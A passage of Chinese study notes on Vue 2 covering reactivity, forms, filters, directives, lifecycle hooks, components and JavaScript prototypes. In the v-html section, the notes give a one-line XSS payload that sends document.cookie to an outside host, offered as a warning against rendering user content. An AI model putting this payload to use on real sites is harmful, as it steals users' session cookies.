![image-20221009163305125](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221009163305125.png)

* 改动属性：

![image-20221009163520070](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221009163520070.png)

### Vue.set()方法

* vue中，vm中的数据是由vm.\_data中代理而来的，不能通过页面直接向vm中添加属性，也不能向vm.\_data中添加属性，因为添加后vm.\_data中没有对应属性的set和get函数。所以初始化data之前一定要想好data里边到底该填什么东西，后来再补也不是不行
  * **插值语法中如果这个值是undefined那么Vue默认不显示**，当然如果调用data里边没有的属性会报错
  * 可以使用`Vue.set()`函数，见下图，当然可以把`vm._data.student`换成`vm.student`

![image-20221009194705929](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221009194705929.png)

* * 或者可以用Vue实例的`vm.$set()`也可以实现
  * 当然这个api也有局限，**在调这个函数的时候第一个参数不允许是vm(或._data)**

### Vue监视数据的原理——数组

* 大标题讲解的是对象的监视，数组属性由于vue中没有配置set和get，故根据列表索引值更改数组的值Vue也监测不到
  * Vue中规定，如果利用push/pop/shift/unshift/splice/sort/reverse更改数组才能监视到值的变化

```js
 updateMei(){
                // this.hobby[0] = "学习" 不好使
                this.hobby.splice(0, 1, '学习') //好使
            }
```

* * 写在vue属性里边的push是vue单独封装的push，实现过程如下：
    * 第一步还是调了数组原型的push
    * 第二步重新解析了模板
* 当然，**可以用Vue.set()修改数组中的值，其中key是索引**

### 案例和总结

```html
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄＋1岁</button><br>
        <button @click="addGender">添加性别属性，默认值：男</button><br>
        <button @click="addFriend">在列表首位添加一个朋友</button><br>
        <button @click="changeFriend">修改第一个朋友的名字为：张三</button><br>
        <button @click="addHobby">添加一个爱好</button><br>
        <button @click="changeHobby">修改第一个爱好为：开车</button><br>
        <h3>name: {{student.name}}</h3>
        <h3>age: {{student.age}}</h3>
        <h3 v-if="student.gender">gender: {{student.gender}}</h3>
        <h3>hobby:</h3>
        <ul>
            <li v-for="(h, index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <ul>
            <h3>朋友们：</h3>
            <li v-for="(f, index) in student.friends" :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    const vm = new Vue({
        el: '#root',
        data: {
            student: {
                name: 'Tom',
                age: 18,
                hobby: ['抽烟', 'smoke', '烫头'],
                friends: [{
                        name: 'jerry',
                        age: 35
                    },
                    {
                        name: 'tony',
                        age: 36
                    }
                ]
            }
        },
        methods: {
            addGender(){
                Vue.set(this.student, 'gender', '男')
            },
            addFriend(){
                this.student.friends.unshift({name: 'tom', age: 20})
            },
            changeFriend(){
                this.student.friends[0].name = "dickson"
            },
            addHobby(){
                this.student.hobby.push('下棋')
            },
            changeHobby(){
                this.$set(this.student.hobby, 0, '开车')
            }
        }
    })
</script>
```

Vue监视数据的原理：

1. Vue会监视data中所有层次的数据
2. 如何监测对象中的数据？
   1. 通过setter实现监视，且要在new Vue时就传入要监测的数据
      1. 对象中后追加的属性，Vue默认不做响应式处理
      2. 如果需要给后添加的属性做响应式，请使用如下api:
         1. `Vue.set(target, propertyName/index, value)或`
         2. `vm.$set(target, propertyName/index, value)`
3. 如何监视数组中的数据？
   1. 通过包裹数组更新元素的方法实现，本质就是做了两件事
      1. 调用原生对应的方法对数组进行更新
      2. 重新解析模板，进而更新页面
4. 在Vue中修改数组中的某个元素一定要使用如下方法：
   1. 使用这些api: `push(),pop(),shift(),unshift(),splice(),sort(),reverse()`
   2. Vue.set()或vm.$set()
5. **注意：Vue.set()和vm.$set()不能给vm或vm的根数据对象(vm._data)添加属性！！！**

### **数据劫持**

给每一个属性都加了一个set和get的方法，这种行为叫数据劫持，例如data中的属性都被劫持了

## 13_收集表单数据

```html
e="checkbox" v-model="userInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br><br>
            所属校区
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select><br><br>
            其他信息：
            <!-- .lazy修饰符是当前输入框失去焦点的一瞬间才让属性值获取值的作用 -->
            <textarea v-model.lazy="userInfo.other"></textarea>
            <br><br>
            <input type="checkbox" v-model="userInfo.agree">
            阅读并接受<a href="www.baidu.com">《尼古丁真》</a>
            <button>提交</button>
        </form>
    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            userInfo: {
                account: '',
                password: '',
                age: '',
                gender: 'gender', //这里指定了默认值
                hobby: [],
                city: '',
                other: '',
                agree: '' //一个checkbox不需要数组
            }

        },
        methods: {
            demo() {
                //一般不推荐程序员直接访问this._data，可以把要传的数据在data中事先打成一个对象
                console.log(JSON.stringify(this.userInfo))
            }
        },
    })
</script>
```

讲义：

* 若 type=text，则v-model收集的是value值，用户输入的就是value值
* 若 type=radio，则v-model收集的是value值，且要给标签配置value值
* 若 type=CheckBox
  1. 没有配置input的value属性，那么收集的就是checked （true or false）
  2. 配置input的value值：
     * v-model的初始值是非数组，那么收集的就是checked （value加了跟没加一样）
     * v-model的初始值是数组，那么收集的就是value组成的数组
* 注：v-model的三个修饰符
  * lazy: 失去焦点再收集数据
  * number：输入字符串转为有效的数字
  * trim：输入首尾空格过滤

## 14_过滤器

* **过滤器管道符前面的属性永远是过滤器函数的第一个参数，不管在插值语法中调用过滤器是否传参**
* 当一个插值语法中有多个过滤器时，过滤器会一级一级往后传，不会把原有的属性直接越级传入后边的过滤器
* **过滤器返回值是把整个插值语法原来的值替换掉**

```html
<body>
    <div id="root">
        <h2>显示格式化后的时间</h2>
        <h3>现在是：{{time}}</h3>
        <h3 @click="timeMethods">methods:{{time_1}}</h3>
        <h3>computed:{{timeComputed}}</h3>
        <h3>过滤器写法：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
    </div>
    <div id="root2">
        <h2 :a="msg | mySlice">{{msg}}</h2>
    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script src="dayjs.min.js"></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    //全局过滤器，注意必须写在所有的Vue实例之前，第一个参数表示过滤器名
    Vue.filter('mySlice', function(value){
        return value.slice(0,4)
    })
    new Vue({
        el: '#root',
        data: {
            time: 1621561377603,
            time_1: '',
            X: 'hello'
        },
        methods: {
            timeMethods() {
                this.time_1 = dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
            }
        },
        computed: {
            timeComputed() {
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
            }
        },
        //局部过滤器
        filters: {
            //ES6有一个形参默认值
            timeFormater(value, str = 'YYYY-MM-DD HH:mm:ss') {
                return dayjs(value).format(str)
            },
            // mySlice(value) {
            //     return value.slice(0, 4)
            // }
        }
    })

    new Vue({
        el: '#root2',
        data: {
            msg: 'hello, atGuigu'
        }
    })
</script>

```

总结过滤器：

* 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
* 语法：
  1. 注册过滤器：Vue.filter(name, callback) 或 new Vue{filters:{}}
  2. **使用过滤器：{{xxx | 过滤器名}} 或 v-bind: 属性 = ‘xxx | 过滤器名’，v-model不好使**
* 备注：
  1. 过滤器也可以接收额外的参数、多个过滤器也可以串联
  2. 并没有改变原本的数据，是产生新的对应数据

## 15_内置指令

### cookie的工作原理（简略）与XSS攻击

![IMG_0055(20221010-215107)](D:\QQ下载和缓存\MobileFile\IMG_0055(20221010-215107).JPG)

* cookie的本质是字符串，类似于JSON，有键值对
* chrome浏览器会在本地磁盘存储许多cookie，cookie能被网站识别并登陆

```
str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟，我找到你想要的东西了！</a>'
```

* document.cookie会获取当前网站cookie，如果被拿走并破解就废了

---

* v-text指令：
  1. 作用：向其所在的节点中渲染文本内容
  2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

* v-html指令
  1. 与text不同的是，可以解析文本标签 `name: '<h3>你好</h3>'`
  2. **在网站上动态渲染任意html是非常危险的，容易导致XSS（冒充用户之手）攻击**
  3. 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上

* v-cloak指令（没有值）
  1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删除到v-cloak属性
  2. 使用CSS配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

如下是属性选择器，display: none表示属性隐藏

```html
<style>
    [v-cloak]{
        display: none;
    }
</style>
```

* v-once指令（没有值）
  1. v-once所在节点在初次动态渲染后，就视为静态内容
  2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
* v-pre指令（没有值）
  1. 跳过其所在节点的编译过程
  2. 可利用它跳过：没有使用指令的语法，没有使用插值语法的节点，会加快编译

## 16_自定义函数指令

### 函数式

* 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍

```
<div id="root">
        <h2>
            当前的n值是：<span v-text="n"></span>
        </h2>
        <h2>
            放大10倍后的n值是：<span v-big="n"></span>
        </h2>
        <button @click="n++">点我n+1</button>
    </div>
...
directives:{
            //这里这里获取到的a是真实DOM，可以通过console.dir(element)和console.log(element instanceof HTMLElement)验证
            big(element, binding){
                console.log(element, binding)
            }
        }
```

![image-20221011201841766](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221011201841766.png)

* 在directives中，函数的默认有两个参数，第一个是真实DOM，第二个上图所示的对象，其中有绑定的表达式(expression)，函数名称(name)，属性名称(rawName)，当前值(value)等
* Big函数何时会被调用？
  1. 指令和元素成功绑定时（一上来）
  2. **指令所在的模板被重新解析时**  **注意，不论这时候是不是属性使用的数据被更改**

### 对象式

* 复习一下原生DOM：

```html
<button id="btn">点我创建一个输入框</button>
    <script type="text/javascript">
        const btn = document.getElementById('btn')
        btn.onclick = ()=>{
            const input = document.createElement('input')

            //当然大部分添加的属性也不是必须在渲染之后执行
            input.className = 'demo'
            input.value = 99
            input.onclick = () => {
                alert(1)
            }

            document.body.appendChild(input)
            input.focus() //注意这里自动获取焦点，必须要在页面渲染完成input框之后才可以
            input.parentElement.style.backgroundColor = 'skyblue' //注意，要是在页面还没添加input框之前获取input框父元素也是会报错，所以必须在渲染之后写
        }
    </script>
```

* 定义一个v-fbind指令，和v-bind功能类似，但可以让其绑定的input元素默认获取焦点(你可以在DOM上加一个autofocus属性不讲武德完成这一操作)

```
<input type="text" v-fbind:value="n">
...
fbind(ele, bind){
                ele.value = bind.value
                ele.focus()
            }
```

* 在上述案例中，页面渲染input框并没有直接将焦点挪到了框内，因为ele.focus()必须要等待页面渲染完成Input框后才能正确执行，**而指令和元素成功绑定的时候并没有渲染页面，就先执行了focus()，**所以渲染完成的页面没有聚焦input
* 完整版自定义函数指令，内置三个函数
  * bind(element,  binding) 指令与元素成功绑定时（一上来）
  * inserted(element, binding)指令所在元素被插入页面时
  * update(element, binding)指令所在的模板被重新解析时
* **bind和update函数执行语句在大部分情况下一样，所以在简写模式下，相当于执行了bind和update函数，而放弃了用的不多的inserted函数的功能**

```
fbind:{
                //当指令与元素成功绑定时（一上来）
                bind(element, binding){
                    element.value = binding.value
                },
                //指令所在元素被插入页面时
                inserted(element, binding){
                    element.focus()
                },
                //指令所在的模板被重新解析时
                update(element, binding){
                    //在重新解析的时候别忘了加上代码
                    element.value = binding.value
                }
            }
```

### 避坑和总结

* 在实际编写函数名的时候，不推荐使用驼峰命名法，比如v-bigNumber，要改为v-big-number。前者vue会自动寻找'bignumber'函数，必须在directives中使用全小写名称才可以被识别。而函数名本身不允许带杠杠，所以回归到函数定义的原始写法，定义函数本本质仍然是键值对（或者可以把冒号和function省略掉）：

  ```
  'big-number': function(){
                  ...
              }
  ```

* **所有的自定义函数的this都是window**，不管是不是箭头函数
* 和过滤器类似，可以写一个全局自定义指令，同样是没有了s

```
Vue.directive('fbind2', {
        //对象或函数
    })
```

## 17_绳命周期

**Vue完成模板的解析并把初始的真实的DOM元素放入页面后（挂载完毕）调用mounted**（在模板更新之后不调用）

* 生命周期函数又名生命周期回调函数、生命周期函数、生命钩子函数
* 生命周期函数中this的指向是vm或组件实例对象

**用debugger调试断点，先开控制台后重新刷新**

红色框表示生命周期函数，绿色框代表流程，黄色框代表判断

![生命周期](D:\VS coding\vue 资料（含课件）\02_原理图\生命周期.png)

* **初始化过程（挂载流程）**

  * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Init  Events & Lifecycle	</span> -> 初始化：生命周期、事件（例如.once修饰符等叫事件），但数据代理还未开始（在vm中还没有_data，也没有数据名和set、get函数）

  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	beforeCreate	</span> -> **无法通过vm访问到data中的数据、methods中的方法**

  * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Init  injections & reactivity	</span> -> 初始化：数据监测、数据代理（英文的意思是注入和响应式）

  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	created	</span> -> **此时可以通过vm访问到data中的数据、methods中配置的方法**

  * 在以下阶段，**Vue开始解析模板，生成虚拟DOM（在内存中），页面还不能显示解析好的页面**

    * <span style="background-color: orange; color: white; border-radius: 5px; font-weight: bold; border: solid orange 2px">	Has 'el' options ?	</span> -> 用vue初始化实例的时候用没有el这个配置项

    * <span style="color: gray; font-weight: bold">when vm.$mount(el) is called</span> ->如果没有el，就等待wm.$mount(el)被调用的时候再继续执行

    * <span style="background-color: orange; color: white; border-radius: 5px; font-weight: bold; border: solid orange 2px">	Has 'template' options ?	</span>-> 用Vue的时候有没有template这个配置项？

    * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Compile template into render function	</span> -> Vue会编译template配置项中的标签放到#root标签内，**注意一个template只能有一个根节点**，有多个需要自己在外边包一下。注意要是定义了template，那么整个template将会替换root跟节点。注意不能使用\<template>标签包裹结构（不能作为根元素，但可以作为子节点使用）。

      ```
      el: '#root',
      //template要是换行需要用ES6的``包装字符串
      template: `<div>
      <h2 :style="{opacity}">欢迎学习</h2>
      <button></button>
      </div>`,
      ```

    * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Compile el's outerHTML as template	</span> -> 编译el外部的html作为模板配置项（**outerHTML指id为el的标签和其所有子标签**，innerHTML指除了那个id为el的所有子标签）

  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	beforeMount	</span> ->**此时页面呈现的是未经Vue编译的DOM结构，所有对DOM的操作，最终都不奏效**

  * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Create vm.$el and replace 'el' with it	</span> ->将页面中的虚拟DOM转为真实DOM插入页面 

  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	mounted	</span> -> **此时页面中呈现的是经过Vue编译的DOM；对DOM的操作均有效（但要尽可能避免，因为Vue的作用就是避免程序员操作原生DOM的）。至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作（重要）**

* **更新流程**
  
  * <span style="color: gray; font-weight: bold">when data changes</span> ->当改数据的时候
  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	beforeUpdate	</span> -> **此时数据是最新的，但页面是旧的，即页面尚未和数据保持同步**
  * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Virtual DOM re-render and patch	</span> ->根据新的数据，生成新的虚拟DOM，随后与旧的虚拟DOM进行比较，最终完成了页面更新，即：完成了Model -> View的更新
  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	updated	</span> -> **此时数据是最新的，页面也是最新的，即：页面和数据保持同步**
  
* **销毁流程**
  
  * <span style="color: gray; font-weight: bold">when vm.$destory() is called</span> ->当不需要vm的时候（执行了销毁方法但是Vue的工作成果还在，页面还显示真实DOM）
    * 用法：完全销毁一个实例，清理它与其他实例的连接，解绑它的全部指令及事件监听器（注意这个事件指的是自定义事件，不是Vue原生的事件）
  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	beforeDestroy	</span> -> **此时vm中所有的：data、methods、指令等等，都处于可用状态，马上要执行销毁过程，一般在此阶段：关闭定时器、取消订阅消息、解绑自定义事件等收尾操作。注意，当走到这一步的时候，是可以再调用方法和修改数据，但是页面不会更新了，因为Vue不会再返回更新流程了（重要）**
  * <span style="background: green; color: white; border-radius: 5px; font-weight: bold ; border: solid green 2px">	Teardown watches,  child components and event listeners	</span> -> 销毁所有的监视(watch)、子组件和事件监听器
  * <span style="color: red; border-radius: 5px; font-weight: bold; border: solid red 2px">	destroyed	</span> -> **这个钩子一般没人用**

总结：

* 常用的生命周期钩子：
  1. mounted：发送ajax请求，启动定时器，绑定自定义事件，订阅消息等**初始化工作**
  2. beforeDestroy：清除定时器、绑定自定义事件、取消订阅等**收尾工作**
* 关于销毁Vue实例
  1. 销毁后借助Vue开发者工具看不到任何消息
  2. 销毁后自定义事件会失效，但原生DOM依然有效
  3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再出发更新流程了

# 第二章：组件化编程

组件的定义：实现应用中局部功能代码和资源的集合

![IMG_0061(20221012-105030)](D:\QQ下载和缓存\MobileFile\IMG_0061(20221012-105030).JPG)

![IMG_0062(20221012-105617)](D:\QQ下载和缓存\MobileFile\IMG_0062(20221012-105617).JPG)

* 非单文件组件：
  * 一个文件中包含有n个组件
* 单文件组件：
  * 一个文件中只包含有1个组件

## JavaScript构造函数和原型

### [构造函数]([(90条消息) js的构造函数理解_laviniatu的博客-CSDN博客_js什么是构造函数](https://blog.csdn.net/sinat_21742529/article/details/83659459?ops_request_misc=%7B%22request%5Fid%22%3A%22166557808216800182155077%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=166557808216800182155077&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83659459-null-null.142^v53^control,201^v3^control_1&utm_term=JS构造函数&spm=1018.2226.3001.4187))

* 在Js中，用new关键字来调用的函数，称为构造函数。构造函数首字母一般大写
* 我们可以通过构造函数创建对象，会将创建对象变得非常方便。在使用对象字面量创建一系列同一类型的对象时，这些对象可能具有一些相似的特征(属性)和行为(方法)，此时会产生很多重复的代码，而使用构造函数就可以实现`代码复用`。
* **构造函数的执行步骤**
  1. 当以new关键字调用时，会创建一个新的内存空间，标记为myClass实例
  2. 函数体内部的this指向该内存
  3. 执行函数体内的代码，给this添加属性，就是给实例添加属性
  4. 默认返回this

```javascript
function myClass(age){
            this.age = age
            console.log(this.age)
            console.log(age)
            console.log(this)
        }

        var a = myClass(18)
        var b = new myClass(19)
        console.log(a)
        console.log(b.__proto__)
```

* 在不是**构造函数的函数中，this指向的是windows**，而在构造函数则指向的是一个新构造的内存。这个新构造的内存给了b，同时被标记成为了myClass的实例。

* 构造函数的返回值
  * 没有添加返回值，默认返回this
  * 手动添加一个基本数据类型的返回值，最终还是返回this
  * **手动添加一个复杂数据类型（对象）的返回值，最终返回该对象（如果指定了返回对象，那么this对象可能被丢失）**

```
function Person3() {
 this.height = '180';
 return ['a', 'b', 'c'];
}

var p3 = new Person3();
console.log(p3.height);  // undefined
console.log(p3.length);  // 3
console.log(p3[0]);      // 'a'
```

* 为了防止因为忘记使用new关键字而调用构造函数，可以加一些判断条件强行调用new关键字，代码如下：

```
function Person(name){
  if (!(this instanceof Person)) {
    return new Person(name);
  }
  this.name = name;
  this.say = function(){
    return "I am " + this.name;
  }
}

var person1 = Person('nicole');
console.log(person1.say()); // I am nicole
var person2 = new Person('lisa');
console.log(person2.say()); // I am lisa
```

### [原型与原型链]([(90条消息) JS中的原型和原型链（图解）_d_ph的博客-CSDN博客_js原型和原型链](https://blog.csdn.net/qq_36996271/article/details/82527256?ops_request_misc=%7B%22request%5Fid%22%3A%22166558086416782414982065%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=166558086416782414982065&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-82527256-null-null.142^v53^control,201^v3^control_1&utm_term=js原型和原型链&spm=1018.2226.3001.4187))

* **原型**

  1. 所有的引用类型（[数组](https://so.csdn.net/so/search?q=数组&spm=1001.2101.3001.7020)、函数、对象）可以自由扩展属性（除null以外）。

  2. 所有的引用类型都有一个’_ _ proto_ _'属性(也叫隐式原型，它是一个普通的对象)。

  3. 所有的函数都有一个’prototype’属性(这也叫显式原型，它也是一个普通的对象)。

  4. 所有引用类型，它的’_ _ proto_ _'属性指向它的构造函数的’prototype’属性。

  5. 当试图得到一个对象的属性时，如果这个对象本身不存在这个属性，那么就会去它的’_ _ proto_ _'属性(也就是它的构造函数的’prototype’属性)中去寻找。

```javascript
//这是一个构造函数
		function Foo(name,age){
			this.name=name;
			this.age=age;
		}
		/*根据要点3，所有的函数都有一个prototype属性，这个属性是一个对象
		再根据要点1，所有的对象可以自由扩展属性
		于是就有了以下写法*/
		Foo.prototype={
			// prototype对象里面又有其他的属性
			showName:function(){
				console.log("I'm "+this.name);//this是什么要看执行的时候谁调用了这个函数
			},
			showAge:function(){
				console.log("And I'm "+this.age);//this是什么要看执行的时候谁调用了这个函数
			}
		}
		var fn=new Foo('小明',19)
		/*当试图得到一个对象的属性时，如果这个对象本身不存在这个属性，那么就会去它
		构造函数的'prototype'属性中去找*/
		fn.showName(); //I'm 小明
		fn.showAge(); //And I'm 19
```

试想如果我们要通过Foo()来创建**很多很多个**对象，如果我们是这样子写的话：

```javascript
function Foo(name,age){
			this.name=name;
			this.age=age;
			this.showName=function(){
				console.log("I'm "+this.name);
			}
			this.showAge=function(){
				console.log("And I'm "+this.age);
			}
		}
```

那么我们创建出来的每一个对象，里面都有showName和showAge方法，这样就会占用很多的资源。
而通过原型来实现的话，只需要在构造函数里面给属性赋值，而把方法写在Foo.prototype属性(这个属性是唯一的)里面。这样每个对象都可以使用prototype属性里面的showName、showAge方法，并且节省了不少的资源。

* 原型链

```javascript
// 构造函数
		function Foo(name,age){
		 	this.name=name;
		 	this.age=age;
		}
		Object.prototype.toString=function(){
			//this是什么要看执行的时候谁调用了这个函数。
			console.log("I'm "+this.name+" And I'm "+this.age);
		}
		var fn=new Foo('小明',19);
		fn.toString(); //I'm 小明 And I'm 19
		console.log(fn.toString===Foo.prototype.__proto__.toString); //true
		
		console.log(fn.__proto__ ===Foo.prototype)//true
		console.log(Foo.prototype.__proto__===Object.prototype)//true
		console.log(Object.prototype.__proto__===null)//true
```

![这里写图片描述](https://img-blog.csdn.net/20180909114030465?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2OTk2Mjcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

首先，fn的构造函数是Foo()。所以：
**fn._ _ proto _ _=== Foo.prototype**
又因为Foo.prototype是一个普通的对象，它的构造函数是Object，所以：
**Foo.prototype._ _ proto _ _=== Object.prototype**
通过上面的代码，我们知道这个toString()方法是在Object.prototype里面的，当调用这个对象的本身并不存在的方法时，它会一层一层地往上去找，一直到null为止。

**所以当fn调用toString()时，JS发现fn中没有这个方法，于是它就去Foo.prototype中去找，发现还是没有这个方法，然后就去Object.prototype中去找，找到了，就调用Object.prototype中的toString()方法。**

这就是原型链，fn能够调用Object.prototype中的方法正是因为存在**原型链**的机制。

另外，在使用原型的时候，一般推荐将需要扩展的方法写在**构造函数的prototype属性**中，避免写在_ _ proto _ _属性里面。

## 18_非单文件组件

<div style="color: red; font-weight: bold; font-size: 20px;">在组件中，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务与哪个容器</div>

```
const school = Vue.extend({
        // el: '#root', 
        data: {
            schoolName: '尚硅谷',
            address: '北京昌平',
            studentName: '张三',
            age: 18
        }
    })
```

* **上述写法会报错，因为组件中data对象式写法会每次使用组件都会使用相同地址的属性，在一个组件的调用中修改某一个值另一个组件调用的值也会显示改变，所以必须写成函数式**

```html
<body>
    <div id="root">
        <!-- 第三步：编写组件标签
            调用和组件名一样 -->
        <school></school> 
        <student></student>
    </div>
</body>

<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;

    //设置全局组件
    const hello = Vue.extend({
        template: ``,
        data(){
            return{
                name: 'Tom'
            }
        }
    })
    Vue.component('hello', hello)

    //创建school组件
    const school = Vue.extend({
        template: `
        <div>
        <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
        </div>
        `,
        data() {
            return {
                schoolName: '尚硅谷',
                address: '北京昌平'
            }
        }
    })

    //创建student组件
    const student = Vue.extend({
        template: `
        <div>
        <h2>学生姓名：{{studentName}}</h2>
        <h2>学生年龄：{{age}}</h2>
        </div>
        `,
        data() {
            return {
                studentName: '张三',
                age: 18
            }
        }
    })

    new Vue({
        el: '#root',
        //第二步：注册组件（局部注册）
        components: {
            school: school, //组件的名称实际上是在vm中定义的，当然推荐变量名和组件名一样（这样就不用写成键值对形式了）
            student: student
        }
    })
</script>
```

Vue中使用组件的三大步骤：

1. 定义组件（创建组件）
2. 注册组件
3. 使用组件（写组件标签）

* 如何定义一个组件？

  使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有一些区别：

  1. el不要写，因为最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器
  2. data必须写成函数，避免组件被复用的时候，数据存在引用关系

  备注：使用template可以配置组件结构

* 如何注册组件

  1. 局部注册：靠new Vue的时候传入components选项
  2. 全局注册：靠Vue.component('组件名'，组件)

* 编写组件标签：

  \<school>\</school>

* 多单词标签名要用横杠，注册的时候加引号

```
components:{
            'my-school': school
        }
```

* 简写形式：const name = options

```
    const name = {
        template:``,
        data(){
            return {
                
            }
        }
    }
```

### 组件的嵌套

* 在套娃组件的时候，父组件必须要写在子组件之前
* 子组件注册在父组件，**父组件的template中要写上子组件的标签，不能直接在模板中写，否则会报错**

```
const school = {
        template:`<div>
            <h2>{{name}}</h2>
            <h2>{{school}}</h2>
            <student></student>
        </div>`,
        data(){
            return {
                name: 'Tom',
                school: '尚硅谷'
            }
        },
        //注意student组件注册在了school里边
        components:{
            student
        }
    }
```

* **定义app组件，包含所有的组件，vm只用引用一个这样的组件，这是标准化组件的写法**

```
//定义app组件，包含所有的组件，vm只用引用一个这样的组件，这是标准化组件的写法
    const app = Vue.extend({
        template: `<div>
            <hello></hello>
            <school></school>
        </div>
        `,
        components:{
            hello,
            school
        }
    })

    new Vue({
        el: '#root',
        data: {
        },
        components:{
            app
        }
    })
```

### VueComponent

关于VueComponent:

1. **school组件本质是一个名为VueComponent的构造函数**，且不是程序员定义的，是Vue.extend生成的
2. 我们只需要写\<school>,Vue解析时就会帮助我们创建school组件的实例对象，即Vue会帮助我们执行：new VueComponent(options)
3. **特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent（如下图源码所示，每调用一次extend都返回一个新的函数）**!!

<img src="D:\QQ下载和缓存\MobileFile\IMG_0064(20221012-164928).JPG" alt="IMG_0064(20221012-164928)" style="zoom: 33%;" />

4. 关于this指向：

   1. 组件配置中：

      data函数、methods中的函数、watch中的函数、computed中的函数 他们的this均是**VueComponent实例对象（和Vue实例对象长得一摸一样）**

   2. new Vue(options)配置中：

      data函数、methods中的函数、watch中的函数、computed中的函数 他们的this均是**Vue实例对象**

5. VueComponent的实例对象，以后简称vc(也可称之为：组件实例对象)

   Vue的实例对象，以后简称vm。**vm有一个$children数组属性，每一个值为嵌套进去的vc**

### 内置关系

* 原型对象
  * **原型对象有两种写法，分别叫显式原型对象和隐式原型对象，这两个对象指向的都是一个原型对象， 不是两个对象**

```
function Demo(){
        this.a = 1
        this.b = 2
    }

    const d = new Demo()

    console.log(Demo.prototype) //显式原型属性
    console.log(d.__proto__) //隐式原型属性
```

* **一个重要的内置关系：VueComponent.prototype.\__proto__ === Vue.prototype**
* **即VueComponent的原型对象的原型对象是Vue的原型对象，不是Object的原型对象**

复习：

1. 所有的引用类型（[数组](https://so.csdn.net/so/search?q=数组&spm=1001.2101.3001.7020)、函数、对象）可以自由扩展属性（除null以外）。

2. 所有的引用类型都有一个’_ _ proto_ _'属性(也叫隐式原型，它是一个普通的对象)。

3. 所有的函数都有一个’prototype’属性(这也叫显式原型，它也是一个普通的对象)。

4. 所有引用类型，它的’_ _ proto_ _'属性指向它的构造函数的’prototype’属性。

5. 当试图得到一个对象的属性时，如果这个对象本身不存在这个属性，那么就会去它的’_ _ proto_ _'属性(也就是它的构造函数的’prototype’属性)中去寻找。

提示：

1. 实例的隐式原型属性永远指向自己缔造者的原型对象
2. 对象永远有\__proto__

![IMG_0066(20221012-222003)](D:\QQ下载和缓存\MobileFile\IMG_0066(20221012-222003).JPG)

* 注意，VueComponent的原型对象的原型对象不是Object的原型对象，而是Vue的原型对象
* **注意，只有当vue模板中写了自定义组件才算调用了VueComponent的实例对象**

## 19_单文件组件

在单文件组件当中，只支持三个标签，template/script/style

ES6三种暴露方式，一般使用默认暴露，这样在引入变量的时候就不需要写花括号了（`import school from 'school.vue'` ）

1. 分别暴露 `export const school = ... `
2. 统一暴露 `export {school}`
3. 默认暴露 `export default school`

**别忘了template必须要有根元素**

* 两个Vue组件

```vue
<template>
  <!-- 组件的结构 -->
  <div>
    <h2>学校名称：{{ schoolName }}</h2>
    <h2>学校地址：{{ address }}</h2>
  </div>
</template>

<script>
export default {
  name: "School", //追求严谨可以在name属性中写上组件名称
  data() {
    return {
